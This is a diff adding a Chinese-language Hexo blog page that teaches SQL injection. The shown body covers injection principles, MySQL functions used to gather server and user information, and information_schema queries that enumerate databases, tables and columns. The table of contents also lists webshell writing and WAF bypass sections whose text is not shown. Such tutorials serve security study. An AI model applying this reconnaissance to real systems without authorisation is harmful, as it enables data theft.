@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="SQL注入的教程、SQLMAP的使用、安全狗、Oracle、Pickachu靶场。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQL注入的教程、SQLMAP的使用、安全狗、Oracle、Pickachu靶场。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_11_13_19_48_58_729.png">
+<meta property="og:image" content="http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_11_13_20_48_58_729.png">
+<meta property="og:image" content="http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_12_11_16_24_57_782.png">
+<meta property="og:image" content="http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_12_11_16_28_53_124.png">
+<meta property="og:image" content="http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_12_22_16_28_53_124.png">
+<meta property="og:image" content="http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_12_22_16_38_53_124.png">
+<meta property="article:published_time" content="2023-12-18T11:23:25.000Z">
+<meta property="article:modified_time" content="2024-01-07T13:20:46.433Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="SQLMap">
+<meta property="article:tag" content="安全狗">
+<meta property="article:tag" content="pikachu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_11_13_19_48_58_729.png">
+
+
+<link rel="canonical" href="http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/","path":"2023/12/18/SQL注入/","title":"SQL注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">sql注入原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">1、什么是SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.2.</span> <span class="nav-text">2、SQL注入产生的条件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql%E6%B3%A8%E5%85%A5%E2%AD%90"><span class="nav-number">3.</span> <span class="nav-text">Mysql注入⭐</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81Sql%E6%B3%A8%E5%85%A5%E4%B8%ADMysql%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E2%AD%90"><span class="nav-number">3.1.</span> <span class="nav-text">1、Sql注入中Mysql常用函数⭐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%85%B3%E4%BA%8EMysql%E6%95%B0%E6%8D%AE%E5%BA%93%E2%AD%90"><span class="nav-number">3.2.</span> <span class="nav-text">2、关于Mysql数据库⭐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E5%85%B3%E4%BA%8EMysql%E6%B3%A8%E9%87%8A"><span class="nav-number">3.3.</span> <span class="nav-text">3、关于Mysql注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81Mysql%E8%B7%A8%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="nav-number">3.4.</span> <span class="nav-text">4、Mysql跨库注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5%E3%80%81Mysql%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E2%AD%90"><span class="nav-number">3.5.</span> <span class="nav-text">5、Mysql文件读写⭐</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%BC%89%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0"><span class="nav-number">3.5.1.</span> <span class="nav-text">1）文件读取函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0%EF%BC%9Aload-file"><span class="nav-number">3.5.1.1.</span> <span class="nav-text">文件读取函数：load_file()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0%EF%BC%9Aload-data-infile"><span class="nav-number">3.5.1.2.</span> <span class="nav-text">文件读取函数：load data infile</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%BC%89%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%87%BD%E6%95%B0"><span class="nav-number">3.5.2.</span> <span class="nav-text">2）文件写入函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#into-outfile"><span class="nav-number">3.5.2.1.</span> <span class="nav-text">into outfile</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#into-dumpfile"><span class="nav-number">3.5.2.2.</span> <span class="nav-text">into dumpfile</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%EF%BC%89%E5%9F%BA%E4%BA%8EMysql%E5%86%99%E5%85%A5shell%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-number">3.5.3.</span> <span class="nav-text">3）基于Mysql写入shell的方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%87%BD%E6%95%B0%E2%AD%90"><span class="nav-number">3.5.3.1.</span> <span class="nav-text">基于文件写入函数⭐</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97%E7%9A%84%E5%86%99%E5%85%A5%E2%AD%90"><span class="nav-number">3.5.3.2.</span> <span class="nav-text">基于全局日志的写入⭐</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E7%9A%84%E5%86%99%E5%85%A5"><span class="nav-number">3.5.3.3.</span> <span class="nav-text">基于慢查询日志的写入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%EF%BC%89%E8%B7%AF%E5%BE%84%E8%8E%B7%E5%8F%96%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95"><span class="nav-number">3.5.4.</span> <span class="nav-text">4）路径获取常见方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E2%AD%90"><span class="nav-number">4.</span> <span class="nav-text">SQL注入⭐</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="nav-number">4.1.</span> <span class="nav-text">简单介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E9%98%B2%E6%AD%A2sql%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E2%AD%90"><span class="nav-number">4.2.</span> <span class="nav-text">后台防止sql注入方法及解决方法⭐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E2%AD%90"><span class="nav-number">4.3.</span> <span class="nav-text">常用⭐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="nav-number">4.4.</span> <span class="nav-text">sql注入分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">4.4.1.</span> <span class="nav-text">1、联合查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">4.4.2.</span> <span class="nav-text">2、报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.4.3.</span> <span class="nav-text">3、布尔盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.4.4.</span> <span class="nav-text">4、时间盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%88%E5%B0%91%E8%A7%81%EF%BC%89"><span class="nav-number">4.4.5.</span> <span class="nav-text">5、堆叠注入（少见）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">4.4.6.</span> <span class="nav-text">6、宽字节注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E5%AE%83%EF%BC%9A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">4.4.7.</span> <span class="nav-text">其它：二次注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E5%AE%83%EF%BC%9ADNSlog%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="nav-number">4.4.8.</span> <span class="nav-text">其它：DNSlog带外注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E5%AE%83%EF%BC%9A%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">4.4.9.</span> <span class="nav-text">其它：参数污染</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="nav-number">4.5.</span> <span class="nav-text">注入提交方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP"><span class="nav-number">5.</span> <span class="nav-text">SQLMAP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLmap%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">5.1.</span> <span class="nav-text">SQLmap是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLmap%E5%AE%89%E8%A3%85"><span class="nav-number">5.2.</span> <span class="nav-text">SQLmap安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMAP%E5%B8%B8%E7%94%A8%E2%AD%90"><span class="nav-number">5.3.</span> <span class="nav-text">SQLMAP常用⭐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMAP%E7%9B%AE%E5%BD%95%E4%BB%8B%E7%BB%8D"><span class="nav-number">5.4.</span> <span class="nav-text">SQLMAP目录介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMAP%E7%89%B9%E6%80%A7"><span class="nav-number">5.5.</span> <span class="nav-text">SQLMAP特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMAP%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="nav-number">5.6.</span> <span class="nav-text">SQLMAP基本命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E7%82%B9%EF%BC%9F%EF%BC%9F%EF%BC%9F"><span class="nav-number">6.</span> <span class="nav-text">Oracle数据库特点？？？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%EF%BC%9F%EF%BC%9F%EF%BC%9F"><span class="nav-number">6.1.</span> <span class="nav-text">靶场？？？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="nav-number">6.2.</span> <span class="nav-text">Oracle数据库介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle%E5%92%8CMySQL%E7%9A%84%E8%AF%AD%E6%B3%95%E5%B7%AE%E5%BC%82"><span class="nav-number">6.3.</span> <span class="nav-text">Oracle和MySQL的语法差异</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%8B%97"><span class="nav-number">7.</span> <span class="nav-text">安全狗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E5%AE%89%E5%85%A8%E7%8B%97%E6%95%99%E7%A8%8B"><span class="nav-number">7.1.</span> <span class="nav-text">安装安全狗教程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%EF%BC%9F%EF%BC%9F%EF%BC%9F"><span class="nav-number">7.2.</span> <span class="nav-text">绕过安全狗？？？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pikachu%E9%9D%B6%E5%9C%BA%EF%BC%9F%EF%BC%9F%EF%BC%9F"><span class="nav-number">8.</span> <span class="nav-text">Pikachu靶场？？？</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">45</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/18/SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入 | Hexo">
+      <meta itemprop="description" content="SQL注入的教程、SQLMAP的使用、安全狗、Oracle、Pickachu靶场。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-12-18 19:23:25" itemprop="dateCreated datePublished" datetime="2023-12-18T19:23:25+08:00">2023-12-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-01-07 21:20:46" itemprop="dateModified" datetime="2024-01-07T21:20:46+08:00">2024-01-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">SQL注入的教程、SQLMAP的使用、安全狗、Oracle、Pickachu靶场。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45954730/article/details/131525362">Sql注入详解(原理篇) sql注入原理 Naive 的博客-CSDN博客</a></p>
+</blockquote>
+<h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><h3 id="1、什么是SQL注入"><a href="#1、什么是SQL注入" class="headerlink" title="1、什么是SQL注入"></a>1、什么是SQL注入</h3><p>SQL注入（SQL Inject）指web应用程序对用户输入数据的合法性没有判断或过滤不严格，攻击者可以在web应用程序中事先定义好的查询语句的给尾添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<p>SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤。SQL注入是针对数据库、后台、系统层面的攻击！</p>
+<p>sql注入属于服务端攻击，原理是参数带入给变量时未经过滤直接带入数据库查询</p>
+<p>sql注入与操作系统、数据库类型、脚本语言类型无关，与程序员写的源代码有关</p>
+<h3 id="2、SQL注入产生的条件"><a href="#2、SQL注入产生的条件" class="headerlink" title="2、SQL注入产生的条件"></a>2、SQL注入产生的条件</h3><ul>
+<li>传递给后端的<code>参数是可以控制的</code></li>
+<li><code>参数内容会被带入到数据库查询</code></li>
+<li>变量未存在过滤或者过滤不严谨</li>
+</ul>
+<h2 id="Mysql注入⭐"><a href="#Mysql注入⭐" class="headerlink" title="Mysql注入⭐"></a>Mysql注入⭐</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">MySQL注入</span><br><span class="line">    - 信息搜集</span><br><span class="line">        - 数据库名</span><br><span class="line">        - 数据库用户</span><br><span class="line">        - 操作系统</span><br><span class="line">        - 数据库版本</span><br><span class="line">        -其它（如：网站路径...）</span><br><span class="line">    - 数据注入（高低版本以5.0为界）</span><br><span class="line">        - 低版本：暴力查询和联合查询</span><br><span class="line">        - 高版本：information_schema有据查询</span><br><span class="line">    - 高权限注入</span><br><span class="line">        - 常规查询</span><br><span class="line">        - 跨库查询：利用注入进行库数据库查询</span><br><span class="line">        - 文件读写</span><br><span class="line">            - 存在魔术引导：编码或宽字节绕过</span><br><span class="line">            - 不存在魔术引导</span><br><span class="line">    - 相关防注入</span><br><span class="line">        - 自带防御：魔术引号</span><br><span class="line">        - 内置函数</span><br><span class="line">        - 自定义关键字</span><br><span class="line">        - WAF防护软件</span><br></pre></td></tr></table></figure>
+
+<h3 id="1、Sql注入中Mysql常用函数⭐"><a href="#1、Sql注入中Mysql常用函数⭐" class="headerlink" title="1、Sql注入中Mysql常用函数⭐"></a>1、Sql注入中Mysql常用函数⭐</h3><blockquote>
+<p>收集操作系统、数据库版本、数据库名字、数据库用户等信息，为后续注入做准备</p>
+<p>函数名和括号之间可以隔一个空格</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">version()                 # 查看数据库版本</span><br><span class="line">database()                # 查看当前数据库名</span><br><span class="line">user()                    # 查看当前数据库用户</span><br><span class="line">system_user()             # 查看系统用户名</span><br><span class="line">session_user()            # 连接数据库的用户名</span><br><span class="line">current_user()            # 当前用户名(可用来查看权限)</span><br><span class="line">group_concat()            # 把数据库中的 某列数据 或 某几列数据 合并为一个字符串，以逗号隔开</span><br><span class="line">concat()                  # 连接字符串，连接两个或多个数组</span><br><span class="line">@@datadir                 # 查看数据库路径</span><br><span class="line">@@basedir                 # mysql安装路径</span><br><span class="line">@@version_compile_os      # 查看操作系统</span><br><span class="line">@@secure_file_priv        # 查看是否满足进行文件读写的条件</span><br><span class="line">@@max_allowed_packet      # 文件大小小于</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看值，例如：</span><br><span class="line">select database()</span><br><span class="line">show variables like &#x27;%datadir%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>其余函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rand()                            # 用来生成随机数的函数，如果有值的话，就是一个固定的随机数。可用于order by</span><br><span class="line">ascii()                           # 返回字符的ASCII码</span><br><span class="line">ord()                             # 返回字符的ASCII码</span><br><span class="line">length()                          # 返回查询字符串的长度</span><br><span class="line">substring(str1, start, length)    # 将一个字符串 str1 从 start 开始，截取 length 个字符。</span><br><span class="line">                                  # 注意 start 从1开始，不是从0开始，这与大多数编程语言中的索引方式不同。</span><br><span class="line">substr(a, b, c)                   # 截取字符串，从b位置开始，截取字符串a的c长度</span><br><span class="line">mid(a, b, c)                      # 截取字符串，从b位置开始(从1开始)，截取字符串a的c位</span><br><span class="line">left(a,b)                         # 截取字符串，从左侧截取a的前b位</span><br><span class="line">hex()    # 字符转换为16进制</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2、关于Mysql数据库⭐"><a href="#2、关于Mysql数据库⭐" class="headerlink" title="2、关于Mysql数据库⭐"></a>2、关于Mysql数据库⭐</h3><p>在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个 <code>information_schema</code> 的数据库，该数据库中包含了当前系统中所有的数据库、表、列、索引、视图等相关的元数据信息，是MySql自身信息元数据的存储库，我们需要记住三个表名，分别是 <code>schemata</code>，<code>tables</code>，<code>columns</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schemata         # 存储的是该用户创建的所有数据库的库名，要记住该表中记录数据库名的字段名为 schema_name。</span><br><span class="line">tables           # 存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库库名和表名的字段分别是 table_schema 和 table_name。</span><br><span class="line">columns          # 存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table_schema、table_name、column_name。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_11_13_19_48_58_729.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询所有的数据库名</span><br><span class="line">select schema_name from information_schema.schemata limit 0,1</span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
+
+<p>mysql库这个是MySQL的核心数据库，主要复制存储数据库的用户、权限设置、关键字等MySQL数据库需要使用的控制和管理信息</p>
+<p><img src="/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_11_13_20_48_58_729.png"></p>
